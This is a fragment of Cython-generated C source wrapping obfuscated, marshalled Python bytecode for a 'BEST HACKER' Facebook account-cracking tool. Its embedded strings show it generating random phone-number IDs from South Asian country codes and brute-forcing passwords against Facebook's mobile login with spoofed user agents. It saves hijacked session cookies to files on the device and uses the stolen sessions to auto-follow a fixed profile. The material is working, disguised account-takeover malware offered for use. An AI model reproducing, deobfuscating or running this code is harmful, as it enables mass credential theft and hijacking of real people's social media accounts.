`\233\000ea\233\000dQeb\233\000ec\233\000dRed\233\000dRee\233\000dRef\233\000dOeg\233\000\235\023ZheX\240ieh\241\001\001\000\220\001qvdSdT\204\000ZddUdV\204\000Zje\010\203\000\001\000d\001S\000)W\351\000\000\000\000Nz\010git pullz\020pkg install curlc\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\002\000\000\000@\000\000\000\363\024\000\000\000e\000Z\001d\000Z\002d\001d\002\204\000Z\003d\003S\000)\004\332\005jalanc\002\000\000\000\000\000\000\000\000\000\000\000\002\000\000\000\001\000\000\000C\000\000\000s\004\000\000\000d\000S\000\251\001N\251\000)\002\332\004self\332\001zr\005\000\000\000r\005\000\000\000\372\006<code>\332\010__init__\027\000\000\000s\002\000\000\000\004\002\372\016jalan.__init__N\251\004\332\010__name__\332\n__module__\332\014__qualname__r\t\000\000\000r\005\000\000\000r\005\000\000\000r\005\000\000\000r\010\000\000\000r\003\000\000\000\023\000\000\000s\004\000\000\000\010\000\014\004r\003\000\000\000a\003\004\000\000   \n\033[1;32m       888    d8P  8888888b.   .d8888b.  \n\033[1;35m       888   d8P   888   Y88b d88P  Y88b \n\033[1;35m       888  d8P    888    888 Y88b.      \n\033[1;32m       888d88K     888   d88P  \"Y888b.   \n\033[1;32m       8888888b    8888888P\"      \"Y88b. \n\033[1;35m       888  Y88b   888 T88b         \"888 \n\033[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\033[1;32m       888    Y88b 888   T88b  \"Y8888P\"  \n\n\033[1;37m================= \033[32;45mBEST-HACKER\033[0;m =====================\n\033[1;32m     \033[1;33mCREATED BY\033[0;m   :  \033[1;33mBEST\033[0;m\033[1;32m HACKER \033[1;33mEDRIS\033[0;m\n\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m BEST HACKER\n\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mBEST-HACKER\n\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE BY BEST HACKER\n\033[1;32m     \033[1;35mTEAM         :  \033[1;35mBEST HACKER\n\033[1;32m     \033[1;36mTOOL VIRSION :  ""\033[1;36m1.0\n\033[1;37m================= \033[32;45mBEST-HACKER\033[0;m =====================\n\n       \033[37;41m\t WELLCOME TO BEST HACKER TOOL\033[0;m\n\n\033[1;37m================== \033[32;45mAFG\033[0;m ======================\nc\000\000\000\000\000\000\000\000\000\000\000\000\001\000\000\000\003\000\000\000C\000\000\000sR\000\000\000t\000\240\001d\001\241\001\001\000t\002t\003\203\001\001\000t\004d\002\203\001\001\000t\004d\003\203\001\001\000t\005d\004\203\001}\000|\000d\005k\002r#t\000\240\001d\006\241\001\001\000t\006\203\000\001\000d\000S\000d\000d\007\203\001\001\000d\000S\000)\010N\332\005clearz\" [1] SUBSCRIBE CHANNEL BEST HACKER\372\t [2] EXITz\026\n   Choose option >>> \332\0011z/xdg-open https://youtube.com/c/BestHacker004200\372\023\n\033[1;31mEXIT\033[0;97m)\007\332\002os\332\006systemr\003\000\000\000\332\004logo\332\005print\332\005input\332\002FD\251\001Z\003optr\005\000\000\000r\005\000\000\000r\010\000\000\000\332\002ud\035\000\000\000\363\024\000\000\000\n\002\010\002\010\002\010\002\010\002\010\002\n\002\006\002\004\002\014\002r\032\000\000\000c\000\000\000\000\000\000\000\000\000\000\000\000\001\000\000\000\003\000\000\000C\000\000\000sR\000\000\000t\000\240\001d\001\241\001\001\000t\002t\003\203\001\001\000t\002d\002\203\001\001\000t\002d\003\203\001\001\000t\004d\004\203\001}\000|\000d\005k\002r#t\000\240\001d\006\241\001\001\000t\005\203\000\001\000d\000S\000d\000d\007\203\001\001\000d\000S\000)\010Nr\017\000\000\000z#\033[1;33m [1] JOINED TELEGRAM CHANNELr\020\000\000\000z\035\n  \033[1;32m Choose option >>> r\021\000\000\000z&xdg-open https://t.me/Best_Hacker00420r\022\000\000\000)\006r\023\000\000\000r\024\000\000\000r\026\000\000\000r\025\000\000\000r\027\000\000\000\332\001or\031\000\000\000r\005\000\000\000r\005\000\000\000r\010\000\000\000r\030\000\000\0003\000\000\000r\033\000\000\000r\030\000\000\000c\000\000\000\000\000\000\000\000\000\000\000\000\001\000\000\000\003\000\000\000C\000\000\000s\246\000\000\000t\000\240\001d""\001\241\001\001\000t\002t\003\203\001\001\000t\002d\002\203\001\001\000t\004d\003\203\001\001\000t\002d\004\203\001\001\000t\002d\005\203\001\001\000t\002d\006\203\001\001\000t\002d\007\203\001\001\000t\005d\010\203\001}\000|\000d\tk\002r,t\006\203\000\001\000d\000d\nk\002r7t\000\240\001d\013\241\001\001\000d\000S\000d\000d\014k\002rBt\000\240\001d\r\241\001\001\000d\000S\000d\000d\016k\002rMt\000\240\001d\017\241\001\001\000d\000S\000d\000d\020\203\001\001\000d\000S\000)\021Nr\017\000\000\000u$\000\000\000\t\360\237\224\245\360\237\224\245RANDOM NUMBER CRACK\360\237\224\245\360\237\224\245\332\000z \033[1;32m [1]\033[1;33m RANDOM CRACK z \033[1;32m [2] \033[1;32mJOIN TELEGRAMz\037 \033[1;32m[3] \033[1;32mJOIN FB PAGEz\030 \033[1;32m[00] \033[1;31mEXITz\036\n   \033[1;32m Choose option >>> r\021\000\000\000\332\0012z\036xdg-open t.me/Best_Hacker00420\332\0013z2xdg-open https://www.facebook.com/Best_hacker00420\332\0010\332\004exitz$\n\033[1;31m  Choose valid option\033[0;97m)\007r\023\000\000\000r\024\000\000\000r\003\000\000\000r\025\000\000\000r\026\000\000\000r\027\000\000\000\332\001ir\031\000\000\000r\005\000\000\000r\005\000\000\000r\010\000\000\000r\034\000\000\000I\000\000\000s*\000\000\000\n\002\010\002\010\002\010\002\010\002\010\002\010\002\010\002\010\002\010\002\006\002\010\002\n\002\004\002\010\002\n\002\004\004\010\002\n\002\004\002\014\002r\034\000\000\000)\001\332\rBeautifulSoup)\001\332\004date)\001\332\010datetime)\001\332\005sleep)\001\332\022ThreadPoolExecutor)\001\332\017ConnectionErrorz9pip install mechanize requests futures bs4==2 > /dev/nullz\017pip install bs4c\002\000\000\000\000\000\000\000\000\000\000\000\007\000\000\000\t\000\000\000C\000\000\000sf\001\000\000|\000j\000d\001d\002|\001i\001d\003\215\002j\001}\002t\002|\002d\004\203\002}\003|\003j\003d\005d\006d\007\215\002}\004d\010d\t\204\000|\004\240\004d\n\241\001D\000\203\001}\005t\005|\005\203\001d\013k\002r2t\006d\014t\007t\010t\007t\010t\007f\005\026\000\203\001\001\000n$t\006d""\rt\t\233\000\235\002t\n\026\000\203\001\001\000t\013t\005|\005\203\001\203\001D\000]\024}\006t\006d\016t\007|\006d\017\027\000|\005|\006\031\000\240\014d\020d\021\241\002t\007f\004\026\000\203\001\001\000qA|\000j\000d\022d\002|\001i\001d\003\215\002j\001}\002t\002|\002d\004\203\002}\003|\003j\003d\005d\006d\007\215\002}\004d\023d\t\204\000|\004\240\004d\n\241\001D\000\203\001}\005t\005|\005\203\001d\013k\002r\211t\006d\024t\007t\010t\007t\010t\007f\005\026\000\203\001\001\000d\000S\000t\006d\025t\t\233\000\235\002t\010\026\000\203\001\001\000t\013t\005|\005\203\001\203\001D\000]\024}\006t\006d\016t\007|\006d\017\027\000|\005|\006\031\000\240\014d\026d\027\241\002t\007f\004\026\000\203\001\001\000q\230t\006d\030\203\001\001\000d\000S\000)\031Nz:https://free.facebook.com/settings/apps/tabbed/?tab=active\332\006cookie\251\001\332\007cookies\372\013html.parserZ\004form\332\004post)\001\332\006methodc\001\000\000\000\000\000\000\000\000\000\000\000\002\000\000\000\003\000\000\000S\000\000\000\363\022\000\000\000g\000|\000]\005}\001|\001j\000\221\002q\002S\000r\005\000\000\000\251\001\332\004text\251\002\332\002.0r\"\000\000\000r\005\000\000\000r\005\000\000\000r\010\000\000\000\332\n<listcomp>\243\000\000\000\363\002\000\000\000\022\000z\033cek_apk.<locals>.<listcomp>Z\002h3r\001\000\000\000z.\r%s[%s!%s] %sSorry there is no Active  Apk%s  u1\000\000\000\r[\360\237\216\256] %s \033[1;95m \342\230\206 Your Active Apps \342\230\206     :z\014\r[%s%s] %s%s\351\001\000\000\000z\020Ditambahkan padaz\021 Ditambahkan padaz<https://free.facebook.com/settings/apps/tabbed/?tab=inactivec\001\000\000\000\000\000\000\000\000\000\000\000\002\000\000\000\003\000\000\000S\000\000\000r/\000\000\000r\005\000\000\000r0\000\000\000r2\000\000\000r\005\000\000\000r\005\000\000\000r\010\000\000\000r4\000\000\000\273\000\000\000r5\000\000\000z8\r%s[%s!%s] %sSorry there is no Expired Apk%s           \nu1\000\000\000\r[\360\237\216\256] %s \033[1;95m \342\227\207 Your Expired Apps \342\227\207   "" :Z\013Kedaluwarsaz\014 Kedaluwarsar\035\000\000\000)\r\332\003getr1\000\000\000r#\000\000\000\332\004findZ\010find_all\332\003lenr\026\000\000\000\332\001N\332\001M\332\005WHITE\332\005GREEN\332\005range\332\007replace)\007\332\007session\332\004coki\332\001w\332\003sop\332\001xZ\004gamer\"\000\000\000r\005\000\000\000r\005\000\000\000r\010\000\000\000\332\007cek_apk\233\000\000\000s&\000\000\000\024\002\n\002\016\002\024\002\014\002\030\002\022\004\020\002&\002\024\006\n\002\016\002\024\002\014\002\032\002\022\004\020\002&\002\014\004rE\000\000\000c\003\000\000\000\000\000\000\000\000\000\000\000\005\000\000\000\005\000\000\000C\000\000\000s\\\000\000\000t\000|\001j\001d\001d\002|\002i\001f\002i\000d\003\244\001\216\001j\002d\004\203\002}\003|\003j\003d\ni\000d\007\244\001\216\001\240\001d\010\241\001}\004|\001j\001d\tt\004|\004\203\001\027\000d\002|\002i\001f\002i\000d\003\244\001\216\001j\002\001\000d\000S\000)\013Nz8https://free.facebook.com/profile.php?id=100015315258519r)\000\000\000r*\000\000\000r,\000\000\000\332\001a\332\005Ikuti)\001\332\006stringZ\004href\372\031https://free.facebook.com)\002rF\000\000\000rG\000\000\000)\005r#\000\000\000r7\000\000\000r1\000\000\000r8\000\000\000\332\003str)\005r\006\000\000\000r@\000\000\000rA\000\000\000\332\001rr7\000\000\000r\005\000\000\000r\005\000\000\000r\010\000\000\000\332\006follow\317\000\000\000s\034\000\000\000\010\002\004\002\006\376\002\002\004\376\004\002\004\376\026\004\016\002\004\002\006\376\002\002\004\376\010\002rL\000\000\000c\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\002\000\000\000@\000\000\000r\002\000\000\000)\004r\003\000\000\000c\002\000\000\000\000\000\000\000\000\000\000\000\003\000\000\000\004\000\000\000C\000\000\000s2\000\000\000|\001d\001\027\000D\000]\022}\002t\000j\001\240\002|\002\241\001\001\000t\000j\001\240\003\241\000\001\000t\004\240\005d\002\241\001\001\000q\004d\000S\000)\003N\332\001\ng;\337O\215\227n\202?)\006\332\003sys\332\006stdout\332\005write\332""\005flush\332\004timer&\000\000\000)\003r\006\000\000\000r\007\000\000\000\332\001er\005\000\000\000r\005\000\000\000r\010\000\000\000r\t\000\000\000\343\000\000\000s\n\000\000\000\014\002\014\002\n\002\014\002\004\372r\n\000\000\000Nr\013\000\000\000r\005\000\000\000r\005\000\000\000r\005\000\000\000r\010\000\000\000r\003\000\000\000\341\000\000\000s\004\000\000\000\010\000\014\002z\007\033[1;91mz\007\033[1;97mz\007\033[1;32mz\007\033[1;33mz\007\033[1;34mz\007\033[1;35mz\007\033[1;92mz\007\033[1;93mz\007\033[1;94mz\007\033[1;95mz\007\033[1;96mz\004\033[0mz\007\033[1;90mz\010\033[1;107mz\010\033[1;106mz\010\033[1;105mz\010\033[1;104mz\010\033[1;103mz\010\033[1;102mz\010\033[1;101mz\010\033[1;100mz\005%H:%Ma\224\006\000\000   \n\n\033[1;32m       BBBBBBBBBBBBBBBBB       HHHHHHHH       HHHHHHHH\n\n\033[1;35m       B::::::::::::::::B      H::::::H        H::::::H\n\n\033[1;35m       B::::::BBBBBB:::::B     H::::::H        H::::::H\n\n\033[1;32m       B:::::B     B:::::B     H::::::H        H::::::H\n\n\033[1;32m       B::::B       B:::::B    HHHHHHHH        HHHHHHHH\n\n\033[1;35m       B::::B      B:::::B     HHHHHHHH        HHHHHHHH\n\n\033[1;35m       B::::BBBBBB:::::B       H::::::H HHHHHH H::::::H\n\n\033[1;32m       B:::::::::::::BB        H::::::H HHHHHH H::::::H\n\n\033[1;32m       B::::BBBBBB:::::B       H::::::H HHHHHH H::::::H\n\n\033[1;35m       B::::B      B:::::B     H::::::H        H::::::H\n\n\033[1;35m       B::::B       B:::::B    H::::::H        H::::::H\n\n\033[1;32m       B::::B      B:::::B     H::::::H        H::::::H\n\n\033[1;32m       BB:::::BBBBBB::::::B    H::::::H        H::::::H\n\n\033[1;35m       B:::::::::::::::::B     H::::::H        H::::::H\n\n\033[1;35m       B::::::::::::::::B      H::::::H        H::::::H\n\n\033[1;32m       BBBBBBBBBBBBBBBBB       HHHHHHHH        HHHHHHHH   \n\n \n\n\033[1;37m================= \033[32;45mBEST Hacker\033[0;m =====================\n\n\033[1;32m     \033[1;33mCREATED BY\033[0;m   :  \033[1;33mBEST""\033[0;m\033[1;32m HACKER \033[1;33mEDRIS NABIZADA\033[0;m\n\n\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m BEST HACKER\n\n\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM BEST HACKER\n\n\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE BY BEST HACKER\n\n\033[1;32m     \033[1;35mTEAM         :  \033[1;35mBEST HACKER\n\n\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m1.0\n\n\033[1;37m================= \033[32;45mBEST\033[0;m =====================\n\n \n\n       \033[37;41m\t WELLCOME TO BEST HACKER TOOL\033[0;m\n\n \n\n\033[1;37m================== \033[32;45mAFG\033[0;m ======================\nc\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\003\000\000\000C\000\000\000s\026\000\000\000t\000\240\001d\001\241\001\001\000t\002t\003\203\001\001\000d\000S\000)\002Nr\017\000\000\000)\004r\023\000\000\000r\024\000\000\000r\026\000\000\000r\025\000\000\000r\005\000\000\000r\005\000\000\000r\005\000\000\000r\010\000\000\000r\017\000\000\000u\001\000\000s\004\000\000\000\n\002\014\002r\017\000\000\000)\001\332\tlocaltime)\001r\024\000\000\000\351\003\000\000\000\351\014\000\000\000Z\002PMZ\002AMz(\n\n\033[1;33mLoading asset files ... \033[0;97mg\315\314\314\314\314\314\024@z\0035.2z*\n\033[1;31mNo internet connection ... \033[0;97mc\001\000\000\000\000\000\000\000\000\000\000\000\003\000\000\000\004\000\000\000C\000\000\000s<\000\000\000g\000d\001\242\001}\001|\001D\000]\025}\002t\000d\002|\000\027\000|\002\027\000\203\001f\001\001\000t\001j\002\240\003\241\000\001\000t\004\240\005d\003\241\001\001\000q\006d\000S\000)\004N)\004z\004.   z\004..  z\004... z\005.... \372\001\rr6\000\000\000)\006r\026\000\000\000rN\000\000\000rO\000\000\000rQ\000\000\000rR\000\000\000r&\000\000\000)\003r1\000\000\000Z\005titikr\034\000\000\000r\005\000\000\000r\005\000\000\000r\010\000\000\000\332\007dynamic\245\001\000\000s\n\000\000\000\010\002\010\002\022\002\026\002\004\374rX\000\000\000i\020'\000\000z\036Mozilla/5.0 (Linux; U; Android)\017r\037""\000\000\000\332\0014\332\0015\332\0016\332\0017\332\0018\332\0019Z\00210Z\00211Z\00212Z\00213Z\00214Z\00215Z\00216Z\00217z\013 en-us; GT-)\032\332\001A\332\001B\332\001C\332\001D\332\001E\332\001F\332\001G\332\001H\332\001I\332\001J\332\001K\332\001Lr;\000\000\000r:\000\000\000\332\001O\332\001P\332\001Q\332\001R\332\001S\332\001T\332\001U\332\001V\332\001W\332\001X\332\001Y\332\001Zr6\000\000\000i\347\003\000\000z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/\351I\000\000\000\351d\000\000\000r \000\000\000ih\020\000\000i$\023\000\000\351(\000\000\000\351\226\000\000\000z\023Mobile Edris/537.36\372\001 z\002; z\002) \332\001.c\000\000\000\000\000\000\000\000\000\000\000\000\020\000\000\000\010\000\000\000C\000\000\000s\314\001\000\000g\000}\000g\000}\001t\000j\001\001\000t\000j\002\001\000t\000\240\003d\001\241\001\001\000t\004t\005\203\001\001\000t\004d\002\203\001\001\000t\004d\003\203\001\001\000t\004d\004\203\001\001\000t\004d\005\203\001\001\000t\004d\004\203\001\001\000t\004d\006\203\001\001\000t\004d\007\203\001\001\000t\004d\010\203\001\001\000t\004d\007\203\001\001\000t\006d\t\203\001}\002t\007d\n\203\001\001\000t\010t\006d\013\203\001\203\001}\003t\t|\003\203\001D\000]\023}\004d\n\240\nd\014d\r\204\000t\td\016\203\001D\000\203\001\241\001}\005|\000\240\013|\005\241\001\001\000qIt\000\240\003d\001\241\001\001\000t\007t\005\203\001\001\000t\010t\006d\017\203\001\203\001}\006g\000}\007t\007d\n\203\001\001\000t\t|\006\203\001D\000]\013}\010t\006d\020\203\001}\t|\007\240\013|\t\241\001\001\000qvt\014d\021d\022\215\001\217E}\nt\r\203\000\001\000t\016t\017|\000\203\001\203\001}\013t\007d\023|\013\027\000\203\001\001\000t\007d\024\203\001\001\000t\007d\025\203\001\001\000t\007d\004\203\001\001\000|\000D\000]\037}\014|\014d\026d\000\205\002\031\000g\001}\r|\002|\014\027\000}\016|\007D\000]\007}\017|\r\240\013|\017\241\001\001\000q\264|\n\240\020t\021|\016|\r|\013\241\004\001\000q\245W\000d\000\004\000\004\000\203\003\001\000n\0101\000s\317w\001\001\000\001\000""\001\000Y\000\001\000t\007d\004\203\001\001\000t\007d\027\203\001\001\000t\007d\030\203\001\001\000t\007d\004\203\001\001\000d\000S\000)\031Nr\017\000\000\000z\"\033[1;37m\t \032 USE OUR COUNTRY CODE \032 zc\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97mz3\033[1;32m============================================ze\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97mzb\033[1;36m     \t     BD CODES\n     \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97mz4\033[1;32m============================================\nzc\033[1;36m     \t     AFG CODES\n     \033[1;33m93780, \033[1;33m93799 ,\033[1;33m93701 ,\033[1;33m93777  ...\033[0;97mz\014 PUT CODE : r\035\000\000\000z9 EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: c\001\000\000\000\000\000\000\000\000\000\000\000\002\000\000\000\004\000\000\000s\000\000\000s\034\000\000\000\201\000|\000]\t}\001t\000\240\001t\002j\003\241\001V\000\001\000q\002d\000S\000r\004\000\000\000)\004\332\006random\332\006choicerH\000\000\000Z\006digits)\002r3\000\000\000\332\001_r\005\000\000\000r\005\000\000\000r\010\000\000\000\332\t<genexpr>\006\002\000\000s\004\000\000\000\002\200\032\000z\024i.<locals>.<genexpr>\351\007\000\000\000z\033[*] Enter Password Limit : z\025[*] Enter Password : \3512\000\000\000)\001Z\013max_workersz\023\033[1;36m TOTAL IDS: z$\033[1;36m THE PROCESS HAS BEEN STARTEDz*\033[1;31m USE AEROPLANE MOOD IN EVERY 2 MIN r6\000\000\000z Crack process has been completedz\032Ids saved in ok.txt,cp.txt)\022r\023\000\000\000\332\006getuid\332\007geteuidr\024\000\000\000r\003\000\000\000r\025\000\000\000r\027\000\000\000r\026\000\000\000\332\003intr>\000\000\000\332\004join\332\006append\332\nThreadPoolr\017\000\000\000rJ\000\000\000r9\000\000\000Z\006submit\332\006rcrack)\020\332\004userZ\003twf\332\004codeZ\005limitZ\004nmbrZ\003nmpZ\005passxZ\007Hamii""IDZ\005bilalZ\003pwwZ\010manshera\332\002tlZ\004love\332\003pwx\332\003uidZ\004Emanr\005\000\000\000r\005\000\000\000r\010\000\000\000r\"\000\000\000\333\001\000\000s`\000\000\000\004\002\004\002\006\002\006\002\n\002\010\002\010\006\010\002\010\002\010\002\010\002\010\002\010\002\010\001\010\002\010\002\010\002\014\002\014\002\030\002\014\002\n\002\010\002\014\002\004\002\010\002\014\002\010\002\014\002\014\002\006\002\014\002\014\002\010\002\010\002\010\002\010\002\016\002\010\002\010\002\014\002\022\002\002\366\034\362\010\032\010\002\010\002\014\002r\"\000\000\000c\003\000\000\000\000\000\000\000\000\000\000\000\r\000\000\000\013\000\000\000C\000\000\000sp\002\000\000\220\001z0|\001D\000\220\001]\016}\003t\000\240\001t\002\241\001}\004t\003\240\004\241\000}\005|\005\240\005d\001\241\001j\006}\006t\007\240\010d\002t\t|\006\203\001\241\002\240\nd\003\241\001t\007\240\010d\004t\t|\006\203\001\241\002\240\nd\003\241\001t\007\240\010d\005t\t|\006\203\001\241\002\240\nd\003\241\001t\007\240\010d\006t\t|\006\203\001\241\002\240\nd\003\241\001d\007d\007|\000|\003d\010d\t\234\t}\007i\000d\nd\013\223\001d\014d\r\223\001d\016d\017\223\001d\020d\021\223\001d\022d\023\223\001d\024d\025\223\001d\026d\027\223\001d\030d\031\223\001d\032d\033\223\001d\034d\035\223\001d\036d\037\223\001d d!\223\001d\"d#\223\001d$d%\223\001d&d'\223\001d(d)\223\001d*d+\223\001d,d-|\004d.\234\003\245\001}\010|\005j\013d/|\007|\010d0\215\003j\006}\t|\005j\014\240\r\241\000\240\016\241\000}\nd1|\nv\000r\330d2\240\017d3d4\204\000|\005j\014\240\r\241\000\240\020\241\000D\000\203\001\241\001}\013|\013d5d6\205\002\031\000}\014t\021d7|\014\027\000d8\027\000|\003\027\000d9\027\000|\013\027\000d:\027\000|\004\027\000d;\027\000\203\001\001\000t\022|\005|\013\203\002\001\000t\023d<d=\203\002\240\024|\014d8\027\000|\003\027\000d>\027\000\241\001\001\000t\025\240\026|\014\241\001\001\000\001\000n<d?|\nv\000\220\001r\023d2\240\017d@d4\204\000|\005j\014\240\r\241\000\240\020\241\000D\000\203\001\241\001}\013|\013d""AdB\205\002\031\000}\014t\021dC|\014\027\000d8\027\000|\003\027\000d;\027\000\203\001\001\000t\023dDd=\203\002\240\024|\014d8\027\000|\003\027\000dE\027\000\241\001\001\000t\027\240\026|\014\241\001\001\000\001\000n\001q\004t\030d\0037\000a\030t\031j\032\240\024dFt\033t\030|\002t\034t\025\203\001t\034t\027\203\001f\005\026\000\241\001f\001\001\000t\031j\032\240\035\241\000\001\000W\000d\000S\000\001\000\001\000\001\000Y\000d\000S\000)GNrI\000\000\000z\030name=\"lsd\" value=\"(.*?)\"r6\000\000\000z\034name=\"jazoest\" value=\"(.*?)\"z\031name=\"m_ts\" value=\"(.*?)\"z\027name=\"li\" value=\"(.*?)\"r \000\000\000z\006Log In)\tZ\003lsdZ\007jazoestZ\004m_tsZ\002liZ\ntry_numberZ\022unrecognized_triesZ\005emailZ\004passZ\005loginZ\tauthorityz\021free.facebook.comr.\000\000\000Z\003GETZ\006schemeZ\005httpsZ\006acceptz\207text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8z\017accept-encodingz\021gzip, deflate, brz\017accept-languagez\014en-US,en;q=1z\rcache-controlz#no-cache, no-store, must-revalidateZ\007refererz\027https://t.facebook.com/z\tsec-ch-uaz>\"Google Chrome\";v=\"90\", \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"75\"z\020sec-ch-ua-mobilez\002?1z\022sec-ch-ua-platformZ\007Windowsz\016sec-fetch-destZ\010documentz\016sec-fetch-modeZ\010navigatez\016sec-fetch-sitez\013same-originz\016sec-fetch-userz\002?0Z\006pragmaz\010no-cacheZ\010priorityz\003u=0z\014cross-originr\021\000\000\000)\003z\034cross-origin-resource-policyz\031upgrade-insecure-requestsz\nuser-agentzBhttps://free.facebook.com/login/device-based/regular/login/?refsrc)\002\332\004dataZ\007headersZ\006c_user\372\001;c\001\000\000\000\000\000\000\000\000\000\000\000\003\000\000\000\004\000\000\000S\000\000\000\363\034\000\000\000g\000|\000]\n\\\002}\001}\002|\001d\000\027\000|\002\027\000\221\002q\002S\000\251\001\372\001=r\005\000\000\000\251\003r3\000\000\000\332\003key\332\005valuer\005\000\000\000r\005\000\000\000r\010""\000\000\000r4\000\000\000\226\002\000\000\363\002\000\000\000\034\000z\032rcrack.<locals>.<listcomp>r\201\000\000\000\351\026\000\000\000u\031\000\000\000    \033[1;32m(B-H-OK\360\237\224\245)  z\003 | z\033  \n \033[1;33mCookie = \033[1;32mz\003 \n z\t  \033[0;97mz\022/sdcard/B-H-OK.txtrF\000\000\000rM\000\000\000Z\ncheckpointc\001\000\000\000\000\000\000\000\000\000\000\000\003\000\000\000\004\000\000\000S\000\000\000r\221\000\000\000r\222\000\000\000r\005\000\000\000r\224\000\000\000r\005\000\000\000r\005\000\000\000r\010\000\000\000r4\000\000\000\246\002\000\000r\227\000\000\000\351\030\000\000\000\351'\000\000\000u\031\000\000\000    \033[1;30m(B-H-CP\360\237\244\225)  z\022/sdcard/B-H-CP.txtz\002 \nz1\r     %s[BEST-HACKER] [%s/%s]  OK:- %s  CP:- %s \r)\036r}\000\000\000r~\000\000\000\332\004ugen\332\010requestsZ\007Sessionr7\000\000\000r1\000\000\000\332\002re\332\006searchrJ\000\000\000\332\005groupr-\000\000\000r+\000\000\000Z\010get_dict\332\004keysr\206\000\000\000\332\005itemsr\026\000\000\000rE\000\000\000\332\004openrP\000\000\000\332\003oksr\207\000\000\000\332\003cps\332\004looprN\000\000\000rO\000\000\000rf\000\000\000r9\000\000\000rQ\000\000\000)\rr\216\000\000\000r\215\000\000\000r\214\000\000\000Z\002psZ\003pror@\000\000\000Z\007free_fbZ\010log_dataZ\rheader_freefbZ\002loZ\013log_cookiesrA\000\000\000Z\003cidr\005\000\000\000r\005\000\000\000r\010\000\000\000r\211\000\000\000>\002\000\000s\226\000\000\000\004\014\n\002\n\002\010\002\014\002\024\004\024\002\024\002\024\002\002\002\002\002\002\002\002\002\002\002\006\356\010\024\004\002\002\376\004\004\002\374\004\006\002\372\004\010\002\370\004\n\002\366\004\014\002\364\004\016\002\362\004\020\002\360\004\022\002\356\004\024\002\354\004\026\002\352\004\030\002\350\004\032\002\346\004\034\002\344\004\036\002\342\004 \002\340\002\"\002\002\002\002\010\332\022(\016\002\010\002\036\002\014\002(\002\n\002\034\002\n\002\004\002\n\002\036\002\014\002\030\002\034\002\n\002\004\002\002\004\010\002$\002""\020\002\006\002\006\002r\211\000\000\000)kr\023\000\000\000rN\000\000\000rR\000\000\000r\234\000\000\000Z\004uuidr\024\000\000\000r\003\000\000\000r\025\000\000\000r\032\000\000\000r\030\000\000\000r\034\000\000\000Z\004jsonr}\000\000\000r\235\000\000\000rH\000\000\000\332\010platform\332\006base64Z\003bs4r#\000\000\000rC\000\000\000Z\004ressr%\000\000\000r$\000\000\000r&\000\000\000Z\005waktuZ\022concurrent.futuresr'\000\000\000r\210\000\000\000Z\tmechanizeZ\023requests.exceptionsr(\000\000\000\332\023ModuleNotFoundErrorrE\000\000\000rL\000\000\000Z\003REDr<\000\000\000r=\000\000\000Z\006YELLOWZ\004BLUEZ\006ORANGErl\000\000\000r;\000\000\000rf\000\000\000ri\000\000\000r`\000\000\000rq\000\000\000rk\000\000\000r:\000\000\000r_\000\000\000Z\002BNZ\003BBLZ\002BPZ\002BBZ\002BKZ\002BHZ\002BMZ\002BAZ\010my_colorr~\000\000\000Z\005warnaZ\003now\332\010strftimeZ\tdt_stringZ\007currentZ\004yearZ\002taZ\005monthZ\002buZ\003dayZ\002haZ\005todayr\245\000\000\000r\243\000\000\000r\244\000\000\000r\017\000\000\000rT\000\000\000Z\002lt\332\003cmdr\205\000\000\000Z\003ltxrF\000\000\000\332\003tagr\026\000\000\000\332\001v\332\006updaterJ\000\000\000rX\000\000\000Z\005ugen2r\233\000\000\000r>\000\000\000Z\002xdZ\002aa\332\001b\332\001c\332\001dZ\trandrangerS\000\000\000\332\001f\332\001g\332\001hr\"\000\000\000\332\001j\332\001k\332\001lZ\005uaku2r\207\000\000\000r\211\000\000\000r\005\000\000\000r\005\000\000\000r\005\000\000\000r\010\000\000\000\332\010<module>\001\000\000\000s\336\000\000\000\010\004\010\002\010\002\010\002\010\002\n\002\n\002\016\002\004\010\010\002\010\026\010\026P.\n\002\014\002\014\002\010\002\014\002\014\002\014\002\014\002\002\002\010\002\014\002\010\002\020\002\014\002\n\002\016\002\002\374\010\010\0104\016\022\004\016\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\004\002\020\004\004\376\n\004\010\002\n\002\010\002\006\002\006\002""\006\002\010\002\004\002\004<\004\002\004\002\010\004\014\006\014\002\016\002\n\002\010\002\006\002\004\004\004\002\002\006\010\002\004\002\004\002\004\002\016\002\014\002\002\002\004\200\020\002\010\004\004\016\004\002\014\004\004\002\016\002\004\002\016\002\014\002\016\002\004\002\014\002\004\002\014\002\014\002\004\002B\002\016\002\010\006\010c\000\n\005";
static PyObject *__pyx_n_s_builtins;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_loads;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_marshal;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_kp_b_s_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_tuple_;
/* Late includes */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
